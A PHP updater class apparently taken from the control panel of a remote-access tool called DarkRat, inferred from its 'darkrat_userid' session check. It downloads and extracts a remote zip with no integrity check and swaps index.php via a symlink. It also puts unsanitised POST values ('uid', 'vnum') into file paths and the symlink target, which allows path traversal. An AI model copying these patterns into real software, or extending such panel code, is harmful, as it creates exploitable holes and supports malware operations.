<?php


class Update{

    function __construct()
    {
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }
    }

    public  function version_check(){
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = :id");
        $result = $statement->execute(array('id' => 1));
        $config = $statement->fetch();
        $file = fopen ($config["check_update_url"], "r");
        $exploded = explode(";",fgets($file));
        $vnum = $exploded[0];
        fclose($file);
        // check users local file for version number
        $userfile = fopen (__DIR__."/../../Version/vnum_". $_POST['uid'] .".txt", "r");
        $user_vnum = fgets($userfile);
        fclose($userfile);
        if($user_vnum == $vnum){
            // data
            $data = array("version" => 0);
        }else{
            // data
            $data = array("version" => $vnum);
        }
        // send the json data
        echo json_encode($data);
        die();
    }

    public function doUpdate(){

        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = :id");
        $result = $statement->execute(array('id' => 1));
        $config = $statement->fetch();
        $file = fopen ($config["check_update_url"], "r");
        $exploded = explode(";",fgets($file));
        $copy = copy($exploded[1], __DIR__."/../../../../update.zip");
        // check for success or fail
        if(!$copy){
            // data message if failed to copy from external server
            $data = array("copy" => 0);
        }else{
            // success message, continue to unzip
            $copy = 1;
        }
        // check for verification
        if($copy == 1){
            $path = __DIR__."/../../../../../versions/";
            // unzip update
            $zip = new ZipArchive;
            $res = $zip->open( __DIR__."/../../../../update.zip");
            if($res === TRUE){
                $zip->extractTo( $path );
                $zip->close();
                // success updating files
                $data = array("unzip" => 1);
                // delete zip file
                    unlink( __DIR__."/../../../../update.zip");

                    // update users local version number file

                         $target = __DIR__.'/../../../../../index.php';
                         $link = 'versions/'.$_POST['vnum']."/index.php";
                         unlink($target);
                         symlink($link, $target);
                         if(file_exists(__DIR__.'/../../../../../config-backup.php')){
                             unlink(__DIR__.'/../../../../../config-backup.php');
                         }else{
                             rename(__DIR__.'/../../../../../config.php', __DIR__.'/../../../../../config-backup.php');
                         }
                          /*
                            $userfile =fopen (__DIR__."/../../Version/vnum_". $_POST['uid'] .".txt", "w");
                            $user_vnum = fgets($userfile);
                            fwrite($userfile, $_POST['vnum']);
                            fclose($userfile);
                          */

            }else{
                // error updating files
                $data = array("unzip" => 0);
                // delete potentially corrupt file
                unlink(__DIR__."/../../../../update.zip");
            }
        }

        // send the json data
        echo json_encode($data);
        die();
    }

}